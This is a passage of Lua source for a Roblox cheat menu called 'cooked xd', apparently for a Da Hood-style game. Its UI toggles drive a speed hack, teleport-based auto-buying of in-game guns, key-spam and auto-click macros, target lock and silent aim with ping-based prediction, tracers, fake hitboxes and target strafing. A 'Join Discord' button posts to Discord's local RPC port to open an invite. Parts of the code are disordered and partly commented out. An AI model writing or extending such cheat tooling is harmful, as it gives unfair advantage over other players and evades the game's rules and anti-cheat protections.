    local Buy = Tabs.Misc:AddLeftGroupbox('AutoBuy')
    
    Misc:AddToggle('CFrame', {
        Text = 'Enable',
        Default = false,
        Tooltip = 'Enable CFrame',
    })
    getgenv().cfrene = false
    Toggles.CFrame:OnChanged(function()
        getgenv().cframe  = Toggles.CFrame.Value
    end)
    
    Toggles.CFrame:AddKeyPicker('CFrameBind', {
        Default = 'None', 
        SyncToggleState = false, 
    
        Mode = 'Toggle',
    
        Text = 'CFrame', 
        NoUI = false,
    })
    
    Options.CFrameBind:OnClick(function()
        if getgenv().cframe then
            getgenv().cfrene = not getgenv().cfrene
        if getgenv().cfrene == true then
            repeat
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Multiplier
                game:GetService(""RunService"").Stepped:wait()
            until getgenv().cfrene == false
    end
    end
    end)
    
    
    
    
    
    Misc:AddSlider('CFrameSpeed', {
        Text = 'CFrame Speed Amount',
    
        Default = 1,
        Min = 0.5,
        Max = 5,
        Rounding = 2,
    
        Compact = false,
    })
    
    Options.CFrameSpeed:OnChanged(function()
        getgenv().Multiplier = Options.CFrameSpeed.Value
    end)
    
    local inputManager = game:GetService(""VirtualInputManager"")
    local userInputService = game:GetService(""UserInputService"")
    
    Misc:AddToggle('Macro', {
        Text = 'Macro',
        Default = false,
        Tooltip = 'Enable Macro',
    })
    getgenv().macro = false
    Toggles.Macro:OnChanged(function()
        getgenv().macro  = Toggles.Macro.Value
    end)
    
    Toggles.Macro:AddKeyPicker('MacroBind', {
        Default = 'None', 
        SyncToggleState = false, 
    
        Mode = 'Toggle',
    
        Text = 'Macro', 
        NoUI = false,
    })
    
    Options.MacroBind:OnClick(function()
        if getgenv().macro then
            getgenv().mawco = not getgenv().mawco
        if getgenv().mawco == true then
            repeat
                inputManager:SendKeyEvent(true, ""I"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""O"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""I"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""O"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""I"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""O"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""I"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""O"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""I"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""O"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""I"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""O"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""I"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""O"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""I"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""O"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""I"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""O"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""I"", false, game)
                wait()
                inputManager:SendKeyEvent(true, ""O"", false, game)
                wait()
            until getgenv().mawco == false
    end
    end
    end)
    
    Misc:AddToggle('AutoClick', {
        Text = 'Auto Click',
        Default = false,
        Tooltip = 'Enable Macro',
    })
    getgenv().macro = false
    Toggles.AutoClick:OnChanged(function()
        getgenv().click  = Toggles.AutoClick.Value
    end)
    
    Toggles.AutoClick:AddKeyPicker('AutoClickBind', {
        Default = 'None', 
        SyncToggleState = false, 
    
        Mode = 'Toggle',
    
        Text = 'Auto Click', 
        NoUI = false,
    })
    
    getgenv().clickintervaral = 0
    Options.AutoClickBind:OnClick(function()
        if getgenv().click then
            getgenv().click2 = not getgenv().click2
        if getgenv().click2 == true then
            repeat
    mouse1click()
    wait(getgenv().clickintervaral)
    until getgenv().click2 == false
    end
    end
    end)
    
    Misc:AddSlider('ClickWait', {
        Text = 'Autoclick Interveral',
    
        Default = 0.1,
        Min = 0.,
        Max = 0.3,
        Rounding = 6,
    
        Compact = false,
    })
    
    Options.ClickWait:OnChanged(function()
        getgenv().clickintervaral = Options.ClickWait.Value
    end)
    
    
    Buy:AddDropdown('BuyGuns', {
        Values = { '[Revolver]', '[Double Barrel SG]', '[Tactical Shotgun]', '[SMG]', '[Knife]', '[Shotgun]', '[Flame Thrower]', '[RPG]', '[AK-47]'   },
        Default = 20, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
    
        Text = 'Weapons',
        Tooltip = 'Auto Buy Weapons', -- Information shown when you hover over the textbox
    })
    
    Options.BuyGuns:OnChanged(function()
        if Options.BuyGuns.Value == ""[Revolver]"" then
            local k = game.Workspace.Ignored.Shop['[Revolver] - $1339']
            local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
                wait(.2)
                fireclickdetector(k:FindFirstChild(""ClickDetector""), 4)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
            end
        end
    
        if Options.BuyGuns.Value == ""[Double Barrel SG]"" then
            local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            local k = game.Workspace.Ignored.Shop['[Double-Barrel SG] - $1442']
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
                wait(.2)
                fireclickdetector(k:FindFirstChild(""ClickDetector""), 4)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
            end
        end
    
        if Options.BuyGuns.Value == ""[Shotgun]"" then
            local k = game.Workspace.Ignored.Shop['[Shotgun] - $1288']
            local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
                wait(.2)
                fireclickdetector(k:FindFirstChild(""ClickDetector""), 4)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
            end
        end
    
        if Options.BuyGuns.Value == ""[Tactical Shotgun]"" then
            local k = game.Workspace.Ignored.Shop['[TacticalShotgun] - $1751']
            local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
                wait(.2)
                fireclickdetector(k:FindFirstChild(""ClickDetector""), 4)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
            end
        end
        if Options.BuyGuns.Value == ""[SMG]"" then
            local k = game.Workspace.Ignored.Shop['[SMG] - $773']
            local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
                wait(.2)
                fireclickdetector(k:FindFirstChild(""ClickDetector""), 4)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
            end
        end
    
        if Options.BuyGuns.Value == ""[Knife]"" then
            local k = game.Workspace.Ignored.Shop['[Knife] - $155']
            local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
                wait(.2)
                fireclickdetector(k:FindFirstChild(""ClickDetector""), 4)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
            end
        end
    
        if Options.BuyGuns.Value == ""[RPG]"" then
            local k = game.Workspace.Ignored.Shop['[RPG] - $6180']
            local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
                wait(.2)
                fireclickdetector(k:FindFirstChild(""ClickDetector""), 4)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
            end
        end
    
        if Options.BuyGuns.Value == ""[AK-47]"" then
            local k = game.Workspace.Ignored.Shop['[AK47] - $2318']
            local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
                wait(.2)
                fireclickdetector(k:FindFirstChild(""ClickDetector""), 4)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
            end
        end
    
        if Options.BuyGuns.Value == ""[Flame Thrower]"" then
            local k = game.Workspace.Ignored.Shop['[Flamethrower] - $25750']
            local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
            if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
                wait(.2)
                fireclickdetector(k:FindFirstChild(""ClickDetector""), 4)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
            end
        end
    
    end)
    
    Buy:AddDropdown('BuyAmmo', {
        Values = { '[Taco]', '[Hamburger]', '[Pizza]', '[Popcorn]', '[Cranberry]', '[Chicken]', '[Donut]', ''   },
        Default = 20, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
    
        Text = 'Weapons',
        Tooltip = 'Auto Buy Weapons', -- Information shown when you hover over the textbox
    })
    
    Options.BuyAmmo:OnChanged(function()
    
    end)
    
    local VisualsESP = Tabs.Visuals:AddLeftGroupbox('ESP')
    local VisualsWorld = Tabs.Visuals:AddLeftGroupbox('World')
    local TargetVisuals = Tabs.Visuals:AddRightGroupbox('Target Aim')
    --local SilentVisuals = Tabs.Visuals:AddLeftGroupbox('Silent Aim')
    local ChamBox = Tabs.Visuals:AddRightTabbox()

    
    
    -- 





    --
    VisualsWorld:AddLabel('Fog Color'):AddColorPicker('FogColorR', {
        Default = Color3.fromRGB(100, 87, 72), -- Bright green
        Title = 'Fog Color', -- Optional. Allows you to have a custom color picker title (when you open it)
        Transparency = nil, -- Optional. Enables transparency changing for this color picker (leave as nil to disable)
    
        Callback = function(Value)
        end
    })
    
    Options.FogColorR:OnChanged(function()
        game:GetService(""Lighting"").FogColor = Options.FogColorR.Value
    end)
    
    VisualsWorld:AddSlider('FogEnd', {
        Text = 'Fog Distance',
        Default = 800,
        Min = 25,
        Max = 5000,
        Rounding = 1,
        Compact = true, 
    })
    
    Options.FogEnd:OnChanged(function()
        game:GetService(""Lighting"").FogEnd = Options.FogEnd.Value
    end)
    
    
    local TabBox3 = ChamBox:AddTab('Player')
    
    --local ChamBox = Tabs.Visuals:AddRightTabbox()
    
    
    TabBox3:AddToggle('BodyCham', {
        Text = 'Body Cham',
        Default = false, 
        Tooltip = 'Chams Your Body', 
    })
    
    
    Toggles.BodyCham:OnChanged(function()
    
    
        TargetVisuals:AddToggle('TargetHitbox', {
            Text = 'Fake Hitbox',
            Default = false, 
            Tooltip = 'Adds A Fake Hitbox On Your Target', 
        })
        
        Toggles.TargetHitbox:OnChanged(function()
            Lock.Visualize.Hitbox = Toggles.TargetHitbox.Value
        end)
    end)
    
    
    
    Toggles.TargetHitbox:AddColorPicker('TargetHitboxColor', {
        Default = Color3.new(0, 1, 0), -- Bright green
        Title = 'Hitbox Color', -- Optional. Allows you to have a custom color picker title (when you open it)
        Transparency = 1, -- Optional. Enables transparency changing for this color picker (leave as nil to disable)
    })
    
    Options.TargetHitboxColor:OnChanged(function()
        Lock.Drawings.FakeHitbox.Color = Options.TargetHitboxColor.Value
        Lock.Drawings.FakeHitbox.Transparency = Options.TargetHitboxColor.Transparency
    end)
    
    TargetVisuals:AddDropdown('BodyChamMaterial', {
        Values = { 'ForceField', 'Neon', 'Glass' },
        Default = 1, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
    
        Text = 'Cham Material',
        Tooltip = 'Customize The Cham Material', -- Information shown when you hover over the textbox
    })
    
    Options.BodyChamMaterial:OnChanged(function()
       
    end)
    
    
    
    
    Lock.Drawings.FakeHitbox.CFrame = CFrame.new(9999,9999,9999)
    
    
    
    
    TargetVisuals:AddSlider('HitboxSize', {
        Text = 'Hitbox Size',
        Default = 4,
        Min = 1,
        Max = 15,
        Rounding = 1,
        Compact = true, 
    })
    
    Options.HitboxSize:OnChanged(function()
        Lock.Visualize.X = Options.HitboxSize.Value
        Lock.Visualize.Y = Options.HitboxSize.Value
        Lock.Visualize.Z = Options.HitboxSize.Value
    end)
    
    TargetVisuals:AddDropdown('TargetMaterial', {
        Values = { 'Neon', 'Plastic', 'ForceField', 'Glass' },
        Default = 3, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
    
        Text = 'Material',
        Tooltip = 'Hitbox Material', -- Information shown when you hover over the textbox
    })
    
    Options.TargetMaterial:OnChanged(function()
        Lock.Drawings.FakeHitbox.Material = Enum.Material[Options.TargetMaterial.Value]
    end)
    
    
    
    
    TargetVisuals:AddToggle('VisualHighlight', {
        Text = 'Highlight',
        Default = false, 
        Tooltip = 'Adds A Dot To The Targets Aimpart', 
    })
    
    Toggles.VisualHighlight:OnChanged(function()
        Lock.Visualize.Highlight = Toggles.VisualHighlight.Value
    end)
    
    
    
    Toggles.VisualHighlight:AddColorPicker('HighlightFill', {
        Default = Color3.fromRGB(255,0,255),
        Title = 'Highlight Fill Color'
    })
    
    Options.HighlightFill:OnChanged(function()
        getgenv().fillcolor = Options.HighlightFill.Value
    end)
    
    Toggles.VisualHighlight:AddColorPicker('HighlightOutline', {
        Default = Color3.fromRGB(255,255,255),
        Title = 'Highlight Outline Color'
    })
    
    Options.HighlightOutline:OnChanged(function()
        getgenv().outlinecolor = Options.HighlightOutline.Value
    end)
    
    
    
    
    TargetVisuals:AddToggle('VisualDot', {
        Text = 'Dot',
        Default = false, 
        Tooltip = 'Adds A Dot To The Targets Aimpart', 
    })
    
    Toggles.VisualDot:OnChanged(function()
        Lock.Visualize.Dot = Toggles.VisualDot.Value
    end)
    
    Toggles.VisualDot:AddColorPicker('DotColor', {
        Default = Color3.new(0, 1, 0), -- Bright green
        Title = 'Dot Color', -- Optional. Allows you to have a custom color picker title (when you open it)
        Transparency = 1, -- Optional. Enables transparency changing for this color picker (leave as nil to disable)
    })
    
    Options.DotColor:OnChanged(function()
        Lock.Drawings.Dot.Color = Options.DotColor.Value
        Lock.Drawings.Dot.Transparency = Options.DotColor.Transparency
    end)
    
    
    TargetVisuals:AddToggle('VisualTracer', {
        Text = 'Tracer',
        Default = false, 
        Tooltip = 'Adds A Tracer From You To Your Target', 
    })
    
    Toggles.VisualTracer:OnChanged(function()
        Lock.Visualize.Tracer[1] = Toggles.VisualTracer.Value
    end)
    
    Toggles.VisualTracer:AddColorPicker('TracerColor', {
        Default = Color3.new(0, 1, 0), -- Bright green
        Title = 'Tracer Color', -- Optional. Allows you to have a custom color picker title (when you open it)
        Transparency = 1, -- Optional. Enables transparency changing for this color picker (leave as nil to disable)
    })
    
    Options.TracerColor:OnChanged(function()
        Lock.Drawings.Tracer.Color = Options.TracerColor.Value
        Lock.Drawings.Tracer.Transparency = Options.TracerColor.Transparency
    end)
    
    TargetVisuals:AddDropdown('TracerOrigin', {
        Values = { 'Head', 'Mouse', 'Gun', 'Crosshair' },
        Default = 1, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
    
        Text = 'Tracer Origin',
        Tooltip = 'Customize The Tracer Origin', -- Information shown when you hover over the textbox
    })
    
    Options.TracerOrigin:OnChanged(function()
        Lock.Visualize.Tracer[2] = Options.TracerOrigin.Value
    end)
    
    
    
    
    TargetVisuals:AddToggle('TargetUI', {
        Text = 'Target UI',
        Default = false, 
        Tooltip = 'Get info on your targets', 
    })
    
    Toggles.TargetUI:OnChanged(function()
        Lock.Visualize.TargetUI = Toggles.TargetUI.Value
    end)
    
    
    TargetVisuals:AddToggle('TargetFOV', {
        Text = 'FOV',
        Default = false, 
        Tooltip = 'Adds A Fake Hitbox On Your Target', 
    })
    
    Toggles.TargetFOV:OnChanged(function()
        Lock.Drawings.FOV.Visible = Toggles.TargetFOV.Value
    end)
    
    
    Toggles.TargetFOV:AddColorPicker('FOVColor', {
    Default = Color3.new(0, 1, 0), -- Bright green
    Title = 'FOV Color', -- Optional. Allows you to have a custom color picker title (when you open it)
    Transparency = 1, -- Optional. Enables transparency changing for this color picker (leave as nil to disable)
    })
    
    Options.FOVColor:OnChanged(function()
    Lock.Drawings.FOV.Color = Options.FOVColor.Value
     Lock.Drawings.FOV.Transparency = Options.FOVColor.Transparency
    end)
    
    
    
    
        
    --[[local MyButton2 = MyButton:AddButton('Sub button', function()
        print('You clicked a sub button!')
    end)
    
    
    MyButton:AddTooltip('This is a button')
    MyButton2:AddTooltip('This is a sub button')
    
    LeftGroupBox:AddLabel('This is a label')
    LeftGroupBox:AddLabel('This is a label\n\nwhich wraps its text!', true)
    
    LeftGroupBox:AddDivider()
    
    LeftGroupBox:AddSlider('MySlider', {
        Text = 'This is my slider!',
        Default = 0,
        Min = 0,
        Max = 5,
        Rounding = 1,
        Compact = false, 
    })
    
    local Number = Options.MySlider.Value
    Options.MySlider:OnChanged(function()
        print('MySlider was changed! New value:', Options.MySlider.Value)
    end)
    
    Options.MySlider:SetValue(3)
    
    
    LeftGroupBox:AddInput('MyTextbox', {
        Default = 'My textbox!',
        Numeric = false, 
        Finished = false,
    
        Text = 'This is a textbox',
        Tooltip = 'This is a tooltip', 
    
        Placeholder = 'Placeholder text',
    })
    
    Options.MyTextbox:OnChanged(function()
        print('Text updated. New text:', Options.MyTextbox.Value)
    end)
    
    LeftGroupBox:AddDropdown('MyDropdown', {
        Values = { 'This', 'is', 'a', 'dropdown' },
        Default = 1, 
        Multi = false,
    
        Text = 'A dropdown',
        Tooltip = 'This is a tooltip',
    })
    
    Options.MyDropdown:OnChanged(function()
        print('Dropdown got changed. New value:', Options.MyDropdown.Value)
    end)
    
    Options.MyDropdown:SetValue('This')
    
    LeftGroupBox:AddDropdown('MyMultiDropdown', {
        Values = { 'This', 'is', 'a', 'dropdown' },
        Default = 1, 
        Multi = true,
    
        Text = 'A dropdown',
        Tooltip = 'This is a tooltip',
    })
    
    Options.MyMultiDropdown:OnChanged(function()
        -- print('Dropdown got changed. New value:', )
        print('Multi dropdown got changed:')
        for key, value in next, Options.MyMultiDropdown.Value do
            print(key, value) -- should print something like This, true
        end
    end)
    
    Options.MyMultiDropdown:SetValue({
        This = true,
        is = true,
    })
    
    LeftGroupBox:AddLabel('Color'):AddColorPicker('ColorPicker', {
        Default = Color3.new(0, 1, 0),
        Title = 'Some color', 
    })
    
    Options.ColorPicker:OnChanged(function()
        print('Color changed!', Options.ColorPicker.Value)
    end)
    
    Options.ColorPicker:SetValueRGB(Color3.fromRGB(0, 255, 140))
    
    LeftGroupBox:AddLabel('Keybind'):AddKeyPicker('KeyPicker', {
        Default = 'MB2',
        SyncToggleState = false, 
        Mode = 'Toggle', 
        Text = 'Auto lockpick safes', 
        NoUI = false, 
    })]]
    
    
    -- Example of dynamically-updating watermark with common traits (fps and ping)
    local FrameTimer = tick()
    local FrameCounter = 0;
    local FPS = 240;
    
    local WatermarkConnection = game:GetService('RunService').RenderStepped:Connect(function()
        FrameCounter += 1;
    
        if (tick() - FrameTimer) >= 1 then
            FPS = FrameCounter;
            FrameTimer = tick();
            FrameCounter = 0;
        end;
        Library:SetWatermark(('cooked xd | %s fps | %s ms'):format(
            math.floor(FPS),
            math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue())
        ));
    
    
    
    
    
    Library:OnUnload(function()
        Library.Unloaded = true
    end);
    end)
    
    local MenuGroup = Tabs['Settings']:AddRightGroupbox('Menu')
    --AddLeftGroupbox
    
    
    
    MenuGroup:AddLabel('Menu Keybind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu keybind' }) 
    
    MenuGroup:AddToggle('KeybindList', {
        Text = 'Keybind List',
        Default = false, 
        Tooltip = 'Toggles the Keybind List', 
    })
    
    Toggles.KeybindList:OnChanged(function()
        Library.KeybindFrame.Visible  = Toggles.KeybindList.Value
    end)
    
    MenuGroup:AddToggle('Watermark', {
        Text = 'Watermark',
        Default = false, 
        Tooltip = 'Toggles the Watermark', 
    })
    
    Toggles.Watermark:OnChanged(function()
        Library:SetWatermarkVisibility(Toggles.Watermark.Value) 
    end)
    
    
    
    MenuGroup:AddDropdown('UINotis', {
        Values = { 'Xaxa', 'Roblox', 'Akali' },
        Default = 2, -- number index of the value / string
        Multi = false, -- true / false, allows multiple choices to be selected
    
        Text = 'Notification Type',
        Tooltip = 'Change What Notifications Show Up', -- Information shown when you hover over the textbox
    })
    
    Options.UINotis:OnChanged(function()
        getgenv().NotiMode = Options.UINotis.Value
    end)
    
    
    --
    local Unload1 = MenuGroup:AddButton({
        Text = 'Unload',
        Func = function()
            Library:Unload()
        end,
        DoubleClick = true,
        Tooltip = 'Unloads The Cheat'
    })
    
    local Unload2 = Unload1:AddButton({
        Text = 'Join Discord',
        Func = function()
            setclipboard(""discord.gg/lockers"")
            notifications:BuildNotificationUI();
            Notifications(""discord.gg/lockers"");
            local request = (syn and syn.request) or (http and http.request) or http_request
            local HttpService = game:GetService(""HttpService"")
            if request then
                request({
                    Url = 'http://127.0.0.1:6463/rpc?v=1',
                    Method = 'POST',
                    Headers = {
                        ['Content-Type'] = 'application/json',
                        Origin = 'https://discord.com'
                    },
                    Body = HttpService:JSONEncode({
                        cmd = 'INVITE_BROWSER',
                        nonce = HttpService:GenerateGUID(false),
                        args = {code = ""lockers""}
                    })
                })
            end
        end,
        DoubleClick = false, -- You will have to click this button twice to trigger the callback
        Tooltip = 'Joins Our Discord'
    })
    
    Library.ToggleKeybind = Options.MenuKeybind
    
    ThemeManager:SetLibrary(Library)
    SaveManager:SetLibrary(Library)
    
    --SaveManager:IgnoreThemeSettings() 
    
    --SaveManager:SetIgnoreIndexes({ 'MenuKeybind' }) 
    
    ThemeManager:SetFolder('cooked-thm')
    SaveManager:SetFolder('cookedxd-cfg')
    
    SaveManager:BuildConfigSection(Tabs['Settings']) 
    
    ThemeManager:ApplyToTab(Tabs['Settings'])
    
    -- Code Below 
    Options.TargetBind:OnClick(function()
        if Lock.Enabled then 
            Lock.Locking = not Lock.Locking 
            -- 
            if Lock.Locking == true then 
                Lock.Target.Player = Lock:GetClosestPlayer() 
    
                -- target ui
                if Lock.Visualize.TargetUI then
                gui.TextLabel.Text = ""@""..tostring(Lock.Target.Player)
                gui.TextLabel_2.Text = Lock.Target.Player.DisplayName
                RunService.RenderStepped:Connect(function()
                gui.TextLabel_1.Text = ""Health: ""..tostring(Lock.Target.Player.Character.Humanoid.Health)
                end)
    
                local player = Lock.Target.Player
    
                local userId = Lock.Target.Player.UserId
                local thumbType = Enum.ThumbnailType.HeadShot
                local thumbSize = Enum.ThumbnailSize.Size420x420
                local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
    
                local imageLabel = gui.ImageLabel
                imageLabel.Image = content
                imageLabel.Size = UDim2.new(0, 75,0, 75)
                gui.Frame.Visible = true
            end
                -- target ui
    
                if (Lock.Visualize.Notify == true) then 
                    if Lock.Mode == ""Target Aim"" then
                    notifications:BuildNotificationUI();
                    Notifications(""Locked onto: "".. Lock.Target.Player.DisplayName);
                    wait(1) print(Lock.Target.Prediction)
                    else
                        notifications:BuildNotificationUI();
                        Notifications(""Silent Aim Enabled"");
                    end
                else
            end
                -- 
            if Lock.ViewAt then 
                Camera.CameraSubject = Lock.Target.Player.Character.Humanoid
            end     
        else 
            if Lock.Visualize.TargetUI then
            gui.Frame.Visible = false
        end
            Lock.Drawings.Dot.Visible = false 
            Lock.Drawings.Tracer.Visible = false 
            Camera.CameraSubject = LocalPlayer.Character.Humanoid
            LocalPlayer.Character.Humanoid.AutoRotate = true 
            -- 
            if (Lock.Visualize.Notify == true) then 
                if Lock.Mode == ""Target Aim"" then
                    notifications:BuildNotificationUI();
                    Notifications(""Unlocked"");
                    else
                        notifications:BuildNotificationUI();
                        Notifications(""Silent Aim Disabled"");
                    end
            end 
        end 
        end 
    end)
    RunService.Heartbeat:Connect(function(FPS)
        if Lock.Drawings.FOV.Visible and Lock.Drawings.FOV.Position ~= NewVector2(Mouse.X, Mouse.Y + offset) then 
            Lock.Drawings.FOV.Position = NewVector2(Mouse.X, Mouse.Y + offset)
        end
        --   
        if Lock.Locking and Lock.Target.Player and Lock:GetPlayerStatus(Lock.Target.Player) then
            if Lock.Mode == ""Silent Aim"" then 
                Lock.Target.Player = Lock:GetClosestPlayer()
            end 
            -- 
            if Lock.Target.Player and Lock.Target.Player.Character then 
                Lock.Target.Status = Lock:GetPlayerStatus(Lock.Target.Player)
                Lock.Target.Velocity = Lock.Resolver and Lock:CalculateAbsolutePosition(Lock.Target.Player) or Lock.Target.Player.Character.HumanoidRootPart.Velocity
                
                
      --ELEGANT WORK ON THIS, DONT DO ANYTHING ELSE!
      if Lock.Prediction.PingBased then
        local pingvalue = game:GetService(""Stats"").Network.ServerStatsItem[""Data Ping""]:GetValueString()
        local split = string.split(pingvalue,'(')
        local ping = tonumber(split[1])    
        --[[ elegants 
        if ping < 100 then
            Lock.Target.Prediction = 0.141987
        elseif ping < 80 then
            Lock.Target.Prediction = 0.139340
        elseif ping < 70 then
            Lock.Target.Prediction = 0.12533
              elseif ping < 65 then
                Lock.Target.Prediction = 0.1264236
        elseif ping < 50 then
            Lock.Target.Prediction = 0.13544
        elseif ping < 30 then
            Lock.Target.Prediction = 0.11252476
            
            --[[ louls 
            if ping < 30 then
                Lock.Target.Prediction = 0.1099
            elseif
                ping < 35 then
                    Lock.Target.Prediction = 0.2294
                elseif
                    ping < 40 then
                        Lock.Target.Prediction = 0.1195
                    elseif
                        ping < 45 then
                            Lock.Target.Prediction = 0.1207
                        elseif
                            ping < 50 then
                                Lock.Target.Prediction = 0.1219
                            elseif      
                                ping < 55 then
                                    Lock.Target.Prediction = 0.1228
                                elseif
                                    ping < 60 then
                                        Lock.Target.Prediction = 0.1237 
                                    elseif
                                        ping < 65 then 
                                            Lock.Target.Prediction = 0.1264 
                                        elseif
                                            ping < 70 then
                                                Lock.Target.Prediction = 0.1291
                                            elseif
                                                ping < 75 then
                                                    Lock.Target.Prediction = 0.1314
                                                elseif
                                                    ping < 80 then 
                                                        Lock.Target.Prediction = 0.1337 
                                                    elseif
                                                        ping < 85 then
                                                            Lock.Target.Prediction = 0.1343
                                                        elseif
                                                            ping < 90 then
                                                                Lock.Target.Prediction = 0.1349
                                                            elseif
                                                                ping < 95 then
                                                                    Lock.Target.Prediction = 0.1363
                                                                elseif
                                                                    ping < 100 then
                                                                        Lock.Target.Prediction = 0.1378
                                                                    elseif
                                                                        ping < 105 then
                                                                            Lock.Target.Prediction = 0.1418 
                                                                        elseif
                                                                            ping < 110 then
                                                                            Lock.Target.Prediction = 0.1459
                                                                            ]]
    
                                                                            -- sosa sets
    
                                                                            if ping < 10 then
                                                                                Lock.Target.Prediction = 0.1112873
                                                                            elseif ping < 20 then
                                                                                Lock.Target.Prediction = 0.1211928
                                                                            elseif ping < 30 then
                                                                                Lock.Target.Prediction = 0.1254263
                                                                            elseif ping < 40 then
                                                                                Lock.Target.Prediction = 0.1314356
                                                                            elseif ping < 50 then
                                                                                Lock.Target.Prediction = 0.1368384
                                                                            elseif ping < 60 then
                                                                                Lock.Target.Prediction = 0.12671983
                                                                            elseif ping < 70 then
                                                                                Lock.Target.Prediction = 0.12862974
                                                                            elseif ping < 80 then
                                                                                Lock.Target.Prediction = 0.13581963
                                                                            elseif ping < 90 then
                                                                                Lock.Target.Prediction = 0.13873952
                                                                            elseif ping < 100 then
                                                                                Lock.Target.Prediction = 0.14173456
                                                                            elseif ping < 110 then
                                                                                Lock.Target.Prediction = 0.14362652
                                                                            elseif ping < 120 then
                                                                                Lock.Target.Prediction = 0.14683943
                                                                            elseif ping < 130 then
                                                                                Lock.Target.Prediction = 0.15175864
                                                                            elseif ping < 140 then
                                                                                Lock.Target.Prediction = 0.15382643
                                                                            elseif ping < 150 then
                                                                                Lock.Target.Prediction = 0.15873582
                                                                            end
                                                                        end
    
                                                                        if Lock.Target_Strafe[1] then 
                                                                            Lock.Target.Angle += Lock.Target_Strafe[2]
                                                                            LocalPlayer.Character.HumanoidRootPart.CFrame = 
                                                                            Lock.Target.Player.Character.HumanoidRootPart.CFrame 
                                                                            * NewAngle(0, Rad(Lock.Target.Angle), 0) 
                                                                            * NewCFrame(0, Lock.Target_Strafe[4], Lock.Target_Strafe[3])
                                                                        end 
                                                                        --
                                                                        if Lock.LookAt then 
                                                                            LocalPlayer.Character.Humanoid.AutoRotate = false 
